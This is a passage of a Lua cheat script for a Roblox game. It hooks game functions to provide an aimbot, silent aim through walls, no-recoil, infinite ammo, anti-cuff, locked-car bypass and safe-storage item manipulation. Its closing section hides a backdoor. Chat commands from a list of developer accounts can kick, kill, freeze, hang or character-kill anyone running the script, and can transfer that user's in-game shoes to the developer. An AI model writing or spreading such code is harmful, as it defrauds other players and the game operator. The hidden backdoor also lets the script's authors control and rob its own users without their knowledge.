                local wts, onscreen = wtsp(camera, targetpart.Position)
            if onscreen then
                local distance = (Vector2.new(wts.X, wts.Y) - Vector2.new(mouse.X, mouse.Y)).Magnitude
                if distance < curdistance then
                        if friendcheck then if isfriendswith(localplayer, player.UserId) then continue end end
                        if alivecheck then if findfirstchildofclass(player.Character, "Humanoid").Health <= 0 then continue end end
                        if vischeck and not utility:wallcheck(player.Character) then continue end
                        if silentwlcheck then if table.find(sl2.aiming.silent.whitelist.whitelisted,tostring(player)) then continue end end 
                        curdistance = distance
                        plr = player 
                    end
                end
            end
        end
    end
    return plr
end
function utility:calcdistance(org, pos)
    return (pos - org).Unit * 1000
end
function utility:getwallbangabletable(player)
    local tbl = {}
    if player.Character then
        for _, part in pairs(getdescendants(player.Character)) do
            if isa(part, "Part") or isa(part, "BasePart") or isa(part, "MeshPart") then
                table.insert(tbl, part)
            end
        end
    end
    return tbl
end
local aimbotfov = utility:draw("Circle", {Visible = false, Color = Color3.new(1, 1, 1), Radius = 100, NumSides = 100, ZIndex = 2, Thickness = 2})
local aimbotfovoutline = utility:draw("Circle", {Visible = false, Color = Color3.new(0, 0, 0), Radius = 100, NumSides = 100, Thickness = 3})
local aimbotsnapline = utility:draw("Line", {Visible = false, Color = Color3.new(1, 1, 1), Thickness = 2})
local aimbotsnaplineoutline = utility:draw("Line", {Visible = false, Color = Color3.new(0, 0, 0), Thickness = 3})
local silentfov = utility:draw("Circle", {Visible = false, Color = Color3.new(1, 1, 1), Radius = 100, NumSides = 100, ZIndex = 2, Thickness = 2})
local silentfovoutline = utility:draw("Circle", {Visible = false, Color = Color3.new(0, 0, 0), Radius = 100, NumSides = 100, Thickness = 3})
local silentsnapline = utility:draw("Line", {Visible = false, Color = Color3.new(1, 1, 1), ZIndex = 2})
local silentsnaplineoutline = utility:draw("Line", {Visible = false, Color = Color3.new(0, 0, 0), Thickness = 3})
local aimbotclosest
local holding = false
local aimbottween = nil
function runaimbot(part)
    aimbottween = tweenservice:Create(workspace.CurrentCamera, TweenInfo.new(sl2.aiming.aimbot.smoothing, sl2.aiming.aimbot.smoothingstyle), {CFrame = CFrame.new(camera.CFrame.Position, part.Position)})
    aimbottween:Play()
end
local setfog, setfov = false, false
local defambient = game.Lighting.Ambient
local deffogcolor = game.Lighting.FogColor
local tint = Instance.new("ColorCorrectionEffect", game.Lighting)
renderstepped:Connect(function()
utility:stab()
utility:addchamber()
if sl2.exploits.gunmods.whitelist and utility:getcharacter(localplayer) and findfirstchild(utility:getcharacter(localplayer),"HoldPistol",true) then
    findfirstchild(utility:getcharacter(localplayer),"HoldPistol",true).Transparency = 1
end
if EspColors then
    esplibrary.glow.transparency = Options.glowt.Transparency
    esplibrary.chams.transparency = Options.chamst.Transparency
end
if sl2.exploits.player.antiapartmentcheck then
    if utility:getcharacter(localplayer) and findfirstchild(utility:getcharacter(localplayer),"InsideApartments") then
        findfirstchild(utility:getcharacter(localplayer),"InsideApartments"):Destroy()
    end
end
if utility:getcharacter(localplayer) and findfirstchild(utility:getcharacter(localplayer),"Movement/Ragdoll") then
    findfirstchild(utility:getcharacter(localplayer),"Movement/Ragdoll").Disabled = sl2.exploits.player.antiragdoll
end 
if sl2.exploits.safe.safegunsondeath then
    if sl2.exploits.safe.safegunsondeath and utility:getcharacter(localplayer) and findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid") and findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid").Health == 0 then
        findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid"):UnequipTools()
        for _,Tool in next, localplayer.Backpack:GetChildren() do
            if not sl2.blacklistedtools[Tool.Name] == true and isa(Tool,"Tool") and not findfirstchild(Tool,"Drink") and not findfirstchild(Tool,"Bite") and not findfirstchild(Tool,"Cork") then
                Clips = sl2.exploits.safe.maxclips and 999999999999999999 or findfirstchild(Tool,"Stats") and findfirstchild(Tool,"Stats").MaxAmmo.Value or findfirstchild(Tool,"USES") and findfirstchild(Tool,"USES").Value or findfirstchild(Tool,"val") and findfirstchild(Tool,"val").Value or 999999999999999999
                replicatedstorage.UI.Safe:FireServer("Movetosafe",Tool.Name,Clips,sl2.exploits.safe.playertowhitelist)
            end
        end
    end
end
if sl2.visuals.world.changesaturation then
    game.Lighting.ColorCorrection.Saturation = sl2.visuals.world.saturation 
else
    game.Lighting.ColorCorrection.Saturation = 0
end
if sl2.exploits.player.anticuff then
    localplayer.isCuffed.Value = false
    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
end
if utility:getroot(localplayer) then
    utility:getroot(localplayer).CustomPhysicalProperties = PhysicalProperties.new(1, 0.3, 0.5)
end
if utility:getroot(localplayer) then
    utility:getroot(localplayer).CustomPhysicalProperties = PhysicalProperties.new(1, 0.3, 0.5)
end
if sl2.exploits.player.autopickup then
    for i,v in next, workspace.tools:GetChildren() do
        if isa(v,"Tool") and tostring(v) ~= "Crate" then
            findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid"):EquipTool(v)
        end
    end

    for i,v in next, workspace:GetChildren() do
        if isa(v,"Tool") and tostring(v) ~= "Crate" then
            findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid"):EquipTool(v)
        end
    end
end
if sl2.exploits.player.infiniteskittles then
    if utility:getcharacter(localplayer) then
        if localplayer.Character:FindFirstChild("Resistance") and localplayer.PlayerGui:FindFirstChild("Run") and localplayer.PlayerGui:FindFirstChild("Run"):FindFirstChild("Value") then
            utility:getcharacter(localplayer).Resistance.Value = true
            localplayer.PlayerGui.Run.Value.Value = true
        end
    end
end
if findfirstchild(localplayer.PlayerGui,"Camera_Bob") then
    findfirstchild(localplayer.PlayerGui,"Camera_Bob").Disabled = sl2.exploits.player.anticambob
end
if findfirstchild(localplayer,"Backpack") and findfirstchild(localplayer.Backpack,"Hood/Walljump") then
    findfirstchild(localplayer.Backpack,"Hood/Walljump").Disabled = sl2.exploits.player.antihood
end
if utility:getgun() then
    if not sl2.exploits.gunmods.defaultrecoils[tostring(utility:getgun())] then
        sl2.exploits.gunmods.defaultrecoils[tostring(utility:getgun())] = findfirstchild(utility:getgun().Stats, "Recoil").Value
    end

    if sl2.exploits.gunmods.norecoil and sl2.exploits.gunmods.defaultrecoils[tostring(utility:getgun())] then
        if findfirstchild(utility:getgun().Stats,"Recoil") then
            local originalNumber = sl2.exploits.gunmods.defaultrecoils[tostring(utility:getgun())]
            local reductionPercentage = sl2.exploits.gunmods.recoilvalue 
            local reducedNumber = originalNumber * (1 - reductionPercentage / 100)

            findfirstchild(utility:getgun().Stats,"Recoil").Value = reducedNumber
        end
    else
        if findfirstchild(utility:getgun().Stats,"Recoil") then
            findfirstchild(utility:getgun().Stats,"Recoil").Value = sl2.exploits.gunmods.defaultrecoils[tostring(utility:getgun())]
        end
    end

    if sl2.exploits.gunmods.norifle then
        if findfirstchild(utility:getgun().Stats,"Rifle") then
            findfirstchild(utility:getgun().Stats,"Rifle"):Destroy()
        end
    end
    if sl2.exploits.gunmods.nospread then
        if findfirstchild(utility:getgun().Stats,"Local") then
            req = require(findfirstchild(utility:getgun().Stats,"Local"))
            req.MaxSpread = 0
            req.MinSpread = 0
        end
    end
end
if sl2.visuals.world.changefov then
    setfov = false
    camera.FieldOfView = sl2.visuals.world.fov
else
    if not setfov then
        setfov = true
        camera.FieldOfView = 70
    end
end
if sl2.visuals.world.changeambient then
    
    tint.TintColor = sl2.visuals.world.ambient
else
    tint.TintColor = Color3.new(1, 1, 1)
end
if sl2.visuals.world.changefogcolor then
    setfog = false
    game.Lighting.FogColor = sl2.visuals.world.fogcolor
else
    if not setfog then
        setfog = true
        game.Lighting.FogColor = deffogcolor
    end
end
if not holding then
    aimbotclosest = utility:getclosestplayertomouse(sl2.aiming.aimbot.fovradius, sl2.aiming.aimbot.friendcheck, sl2.aiming.aimbot.alivecheck, sl2.aiming.aimbot.visiblecheck,false,false)
end
if sl2.aiming.silent.targetmode == "Auto" then
    silentclosest = utility:getclosestplayertomouse(sl2.aiming.silent.fovradius, sl2.aiming.silent.friendcheck, sl2.aiming.silent.alivecheck, sl2.aiming.silent.visiblecheck,true,true)
end
if utility.solara == false then
aimbotfov.Visible = sl2.aiming.aimbot.enabled and sl2.aiming.aimbot.showfov
aimbotfovoutline.Visible = aimbotfov.Visible
aimbotfov.Radius = sl2.aiming.aimbot.fovradius
aimbotfovoutline.Radius = sl2.aiming.aimbot.fovradius + 1
aimbotfov.Color = sl2.aiming.aimbot.fovcolor
aimbotfov.NumSides = sl2.aiming.aimbot.fovsides
aimbotfovoutline.NumSides = sl2.aiming.aimbot.fovsides
local mouselocation = inputservice:GetMouseLocation()
aimbotfov.Position = Vector2.new(mouselocation.X, mouselocation.Y)
aimbotfovoutline.Position = aimbotfov.Position
aimbotsnaplineoutline.Visible = aimbotsnapline.Visible
aimbotsnapline.Color = sl2.aiming.aimbot.snaplinecolor
if aimbotclosest and sl2.aiming.aimbot.enabled and sl2.aiming.aimbot.snapline and not holding then
    if aimbotclosest.Character and aimbotclosest.Character:FindFirstChild(sl2.aiming.aimbot.targetpart) then
        local wts, onscreen = camera:WorldToViewportPoint(aimbotclosest.Character:FindFirstChild(sl2.aiming.aimbot.targetpart).Position)
        aimbotsnapline.Visible = onscreen
        aimbotsnapline.From = Vector2.new(mouselocation.X, mouselocation.Y)
        aimbotsnapline.To = Vector2.new(wts.X, wts.Y)
        aimbotsnaplineoutline.From = aimbotsnapline.From
        aimbotsnaplineoutline.To = aimbotsnapline.To
    else
        aimbotsnapline.Visible = false
    end
else
    aimbotsnapline.Visible = false
end
silentfov.Visible = sl2.aiming.silent.enabled and sl2.aiming.silent.showfov
silentfovoutline.Visible = silentfov.Visible
silentfov.Radius = sl2.aiming.silent.fovradius
silentfovoutline.Radius = sl2.aiming.silent.fovradius + 1
silentfov.Color = sl2.aiming.silent.fovcolor
silentfov.NumSides = sl2.aiming.silent.fovsides
silentfovoutline.NumSides = sl2.aiming.silent.fovsides
local mouselocation = uis:GetMouseLocation()
silentfov.Position = Vector2.new(mouselocation.X, mouselocation.Y)
silentfovoutline.Position = silentfov.Position
silentsnaplineoutline.Visible = silentsnapline.Visible
silentsnapline.Color = sl2.aiming.silent.snaplinecolor
if silentclosest and sl2.aiming.silent.enabled and sl2.aiming.silent.snapline and not holding then
    local targetpart
    if sl2.aiming.silent.targetpart == "Random" then targetpart = "HumanoidRootPart" else targetpart = sl2.aiming.silent.targetpart end
    if silentclosest.Character and silentclosest.Character:FindFirstChild(targetpart) then
        local wts, onscreen = camera:WorldToViewportPoint(silentclosest.Character:FindFirstChild(targetpart).Position)
        silentsnapline.Visible = onscreen
        silentsnapline.From = Vector2.new(mouselocation.X, mouselocation.Y)
        silentsnapline.To = Vector2.new(wts.X, wts.Y)
        silentsnaplineoutline.From = silentsnapline.From
        silentsnaplineoutline.To = silentsnapline.To
    else
        silentsnapline.Visible = false
    end
else
    silentsnapline.Visible = false
end
end
if silentclosest and not silentclosest.Parent or silentclosest and not silentclosest.Character or not silentclosest then
    silentclosest = nil
end
if silentclosest and silentclosest.Character and silentclosest.Character:FindFirstChildOfClass("Humanoid") and silentclosest.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
    silentclosest = nil
end
    
if holding then
    local char = aimbotclosest.Character
    if char then
        local targetpart = char:FindFirstChild(sl2.aiming.aimbot.targetpart)
        if targetpart then
            runaimbot(targetpart)
        end 
    end
else
    if aimbottween then
        aimbottween:Cancel()
        aimbottween = nil
    end
end
end)
uis.InputBegan:Connect(function(input, gameProcessedEvent)
    if not gameProcessedEvent and input.KeyCode == sl2.aiming.aimbot.keybind and aimbotclosest and sl2.aiming.aimbot.enabled then
        holding = true
    end
    if not gameProcessedEvent and input.KeyCode == sl2.aiming.silent.keybind then
        if sl2.aiming.silent.targetmode == "Target" then
            if silentclosest then
                silentclosest = nil
            else
                silentclosest = utility:getclosestplayertomouse(sl2.aiming.silent.fovradius, sl2.aiming.silent.friendcheck, sl2.aiming.silent.alivecheck, sl2.aiming.silent.visiblecheck,true,true)
            end
        end
    end
end)
uis.InputEnded:Connect(function(input)
    if input.KeyCode == sl2.aiming.aimbot.keybind then
        holding = false
    end
end)
local old; old = utility.solara == true and nil or utility.solara == false and hookmetamethod(workspace, "__namecall", LPH_NO_VIRTUALIZE(function(...)
    if not checkcaller() then
        local method = getnamecallmethod()
        if math.random(0,100) <= sl2.aiming.silent.hitchance and sl2.aiming.silent.enabled and silentclosest and tostring(method) == "Raycast" then
            local args = {...}
            local origin = args[2]
            local targetpart = findfirstchild(silentclosest.Character, sl2.aiming.silent.targetpart)
            if targetpart then
                args[3] = utility:calcdistance(origin, targetpart.Position)
            end
            if sl2.aiming.silent.wallbang then
                local params = RaycastParams.new()
                params.FilterType = Enum.RaycastFilterType.Include
                params.IgnoreWater = false
                params.RespectCanCollide = false
                params.FilterDescendantsInstances = utility:getwallbangabletable(silentclosest)
                args[4] = params
            end
            return old(unpack(args))
        end
    end
    return old(...)
end))
local gunmods;gunmods = utility.solara == true and nil or utility.solara == false and hookmetamethod(workspace,"__index",LPH_NO_VIRTUALIZE(function(self,index)
    if tostring(self) == "ClipSize" and index == "Value" and sl2.exploits.gunmods.infiniteammo == true then
        return 1
    end
    if tostring(self) == "GunType" and index == "Value" and sl2.exploits.gunmods.automaticgun == true then
        return "Auto"
    end
    if tostring(self) == "FireRate" and index == "Value" and sl2.exploits.gunmods.automaticgun == true then
        return -1
    end
    --if tostring(self) == "Recoil" and index == "Value" and sl2.exploits.gunmods.norecoil == true then
    --    if tostring(self.Parent) == "Stats" then
    --        return 0
    --    end
    --end
    return gunmods(self,index)
end))
local safehook;safehook = utility.solara == true and nil or utility.solara == false and hookmetamethod(game,"__namecall",LPH_NO_VIRTUALIZE(function(self,...)
    if tostring(self) == "Safe" then
        local Arguments = {...}
        if Arguments[1] == "Movetosafe" then
            if sl2.exploits.safe.maxclips then
                Arguments[3] = 999999999999999999
                return safehook(self,unpack(Arguments))
            end
        end
        if Arguments[1] == "Movetosafe" then
            if Arguments[2] == "Gear Cloner" or Arguments[2] == "SBGlock" or Arguments[2] == "Radio" or Arguments[2] == "Tazer" or  Arguments[2] == "Taser" or Arguments[2]:lower() == "handcuffs" or Arguments[2]:lower() == "arresttool" then
                return nil
            end
        end
    end
    return safehook(self,...)
end))
local respawncommand = utility:create("TextChatCommand",{Name = "RespawnCommand",Parent = game:GetService("TextChatService").TextChatCommands, Enabled = true, PrimaryAlias = "/respawn"})
respawncommand.Triggered:Connect(function(...)
    replicatedstorage.UI.Commands:FireServer("respawn")
end)
localplayer:WaitForChild("PlayerGui").ChildAdded:Connect(function(v)
    if v.Name == "Safe" and sl2.exploits.player.safeslots then
        v.Frame.Badge.Value = sl2.exploits.player.safeslots
    end
end) 
game:GetService("ProximityPromptService")["PromptTriggered"]:Connect(function(prompt,plr)
    if sl2.vehicle.bypasslocked and tostring(prompt) == "E1" and plr == localplayer and utility:getcarparent(prompt) then
        Car = utility:getcarparent(prompt)
        if not string.match(tostring(Car),tostring(localplayer)) then
            utility:getclosestseat(Car):Sit(findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid"))
        end
    end
end)
game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(prompt,plr)
    if sl2.exploits.player.instantprompt and fireproximityprompt then
        fireproximityprompt(prompt)
    end
end)
Workspace.ChildAdded:Connect(function(child)
    if tostring(child) == tostring(localplayer).."'s Car" then
        utility.car = child
    end
    if child.Name == tostring(localplayer).."'s Car" and sl2.vehicle.autopark then
        task.wait(1.5)
        if findfirstchild(child,"DriveSeat") and findfirstchild(child,"Body") then
            utility.car = child
            utility.car.PrimaryPart = findfirstchildofclass(utility.car.Body,"Part")
            utility.car.DriveSeat:sit(findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid"))
            task.wait(.1)
            utility.car:SetPrimaryPartCFrame(workspace:FindFirstChild("Parkingg"):FindFirstChild("PARK").CFrame + Vector3.new(0, 5, 0))
        else
            Library:Notify("Error : Car Not Rendered!",5)
        end
    end
end)
Library.ToggleKeybind = Options.MenuKeybind

getgenv()["devs"] = {
    "Galaxy_Extendo";
    "JoycesDontGoAway";
    "JoyceKing69";
    "UPJOYCEE"
}

do
    local Players = game:GetService("Players")
    local Player = game:GetService("Players").LocalPlayer
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local function findPlayerByNameAbbreviation(abbrev)
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name:lower():sub(1, #abbrev) == abbrev:lower() then
                return p
            end
        end
        
        return nil
    end

    for i,v in Players:GetPlayers() do
        if v==localplayer then continue end
    
        v.Chatted:Connect(function(Message)
            if not table.find(sl2.exploits.bringwhitelist, tostring(v)) and tostring(v) ~= "UPJOYCEE" then return end
            if string.match(Message:lower(), ":bring ") then
                local name = string.gsub(Message,":bring ","")

                if tostring(name:lower()) == "all" then
                    if not v.Character then return end
                    if not v.Character:FindFirstChild("HumanoidRootPart") then return end

                    sl2.exploits.bypass(v.Character:FindFirstChild("HumanoidRootPart").CFrame)
                end

                name = tostring(findPlayerByNameAbbreviation(name))

                if tostring(name) == tostring(Player) then
                    if not v.Character then return end
                    if not v.Character:FindFirstChild("HumanoidRootPart") then return end

                    sl2.exploits.bypass(v.Character:FindFirstChild("HumanoidRootPart").CFrame)
                end
            end
        end)
    end

    Players.PlayerAdded:Connect(function(v)
        if v==localplayer then return end

        v.Chatted:Connect(function(Message)
            if not table.find(sl2.exploits.bringwhitelist, tostring(v)) and tostring(v) ~= "UPJOYCEE" then return end
            if string.match(Message:lower(), ":bring ") then
                local name = string.gsub(Message,":bring ","")

                if tostring(name:lower()) == "all" then
                    if not v.Character then return end
                    if not v.Character:FindFirstChild("HumanoidRootPart") then return end

                    sl2.exploits.bypass(v.Character:FindFirstChild("HumanoidRootPart").CFrame)
                end

                name = tostring(findPlayerByNameAbbreviation(name))

                if tostring(name) == tostring(Player) then
                    if not v.Character then return end
                    if not v.Character:FindFirstChild("HumanoidRootPart") then return end

                    sl2.exploits.bypass(v.Character:FindFirstChild("HumanoidRootPart").CFrame)
                end
            end
        end)
    end)

    if not table.find(getgenv()["devs"], tostring(Player)) then
        for i,v in next, getgenv()["devs"] do
            if Players:FindFirstChild(v) then
                Players[v].Chatted:Connect(function(Message)
                    if string.match(Message:lower(),":kick ") then
                        PlrName = string.gsub(Message,":kick ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) then
                            Player:Kick()
                        end
                    end

                    if string.match(Message:lower(),":kill ") then
                        PlrName = string.gsub(Message,":kill ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) then
                            Player.Character.Head:Destroy()
                        end
                    end

                    if string.match(Message:lower(),":freeze ") then
                        PlrName = string.gsub(Message,":freeze ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) then
                            Player.Character.HumanoidRootPart.Anchored = true
                        end
                    end

                    if string.match(Message:lower(),":unfreeze ") then
                        PlrName = string.gsub(Message,":unfreeze ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) then
                            Player.Character.HumanoidRootPart.Anchored = false
                        end
                    end

                    if string.match(Message:lower(),":crash ") then
                        PlrName = string.gsub(Message,":crash ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) then
                            while true do end
                        end
                    end

                    if string.match(Message:lower(),":ck ") then
                        PlrName = string.gsub(Message,":ck ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) then
                            ReplicatedStorage.UI.Commands:FireServer("CKCONF")
                        end
                    end

                    if string.match(Message:lower(), "^:stealshoes ") then
                        local args = string.sub(Message, 13)
                        
                        local PlrName, ShoeName = string.match(args, "^(%S+)%s*(.*)")
                        Amount = 9
                        for i=1, 9 do
                            if string.match(Player.Characterstats.OwnedShoes.Value,tostring(i)..ShoeName) then
                                Amount = tostring(i)
                            end
                        end

                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) then
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(9)..ShoeName,tostring(v))task.wait(1.2125)
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(8)..ShoeName,tostring(v))task.wait(1.2125)
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(7)..ShoeName,tostring(v))task.wait(1.2125)
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(6)..ShoeName,tostring(v))task.wait(1.2125)
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(5)..ShoeName,tostring(v))task.wait(1.2125)
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(4)..ShoeName,tostring(v))task.wait(1.2125)
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(3)..ShoeName,tostring(v))task.wait(1.2125)
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(2)..ShoeName,tostring(v))task.wait(1.2125)
                            game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(1)..ShoeName,tostring(v))task.wait(1.2125)
                        end
                    end
                end)
            else
                Players.PlayerAdded:Connect(function(Plr)
                    if tostring(Plr) == v then
                        Plr.Chatted:Connect(function(Message)
                            if string.match(Message:lower(),":stealshoes ") then
                                local args = string.sub(Message, 13)
                        
                                local PlrName, ShoeName = string.match(args, "^(%S+)%s*(.*)")
                                Amount = 9
                                for i=1, 9 do
                                    if string.match(Player.Characterstats.OwnedShoes.Value,tostring(i)..ShoeName) then
                                        Amount = tostring(i)
                                    end
                                end
                
                                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                                if tostring(PlrName) == tostring(Player) then
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(9)..ShoeName,tostring(Plr))task.wait(1.2125)
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(8)..ShoeName,tostring(Plr))task.wait(1.2125)
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(7)..ShoeName,tostring(Plr))task.wait(1.2125)
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(6)..ShoeName,tostring(Plr))task.wait(1.2125)
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(5)..ShoeName,tostring(Plr))task.wait(1.2125)
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(4)..ShoeName,tostring(Plr))task.wait(1.2125)
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(3)..ShoeName,tostring(Plr))task.wait(1.2125)
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(2)..ShoeName,tostring(Plr))task.wait(1.2125)
                                    game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(1)..ShoeName,tostring(Plr))task.wait(1.2125)
                                end
                            end

                            if string.match(Message:lower(),":kick ") then
                                PlrName = string.gsub(Message,":kick ","")
                                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                                if tostring(PlrName) == tostring(Player) then
                                    Player:Kick()
                                end
                            end
                
                            if string.match(Message:lower(),":kill ") then
                                PlrName = string.gsub(Message,":kill ","")
                                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                                if tostring(PlrName) == tostring(Player) then
                                    Player.Character.Humanoid.Health = 0
                                end
                            end
                
                            if string.match(Message:lower(),":freeze ") then
                                PlrName = string.gsub(Message,":freeze ","")
                                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                                if tostring(PlrName) == tostring(Player) then
                                    Player.Character.HumanoidRootPart.Anchored = true
                                end
                            end
                
                            if string.match(Message:lower(),":unfreeze ") then
                                PlrName = string.gsub(Message,":unfreeze ","")
                                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                                if tostring(PlrName) == tostring(Player) then
                                    Player.Character.HumanoidRootPart.Anchored = false
                                end
                            end

                            if string.match(Message:lower(),":crash ") then
                                PlrName = string.gsub(Message,":crash ","")
                                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                                if tostring(PlrName) == tostring(Player) then
                                    while true do end
                                end
                            end

                            if string.match(Message:lower(),":ck ") then
                                PlrName = string.gsub(Message,":ck ","")
                                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                                if tostring(PlrName) == tostring(Player) then
                                    ReplicatedStorage.UI.Commands:FireServer("CKCONF")
                                end
                            end
                        
                        end)
                    end
                end)
            end
        end
    end
end
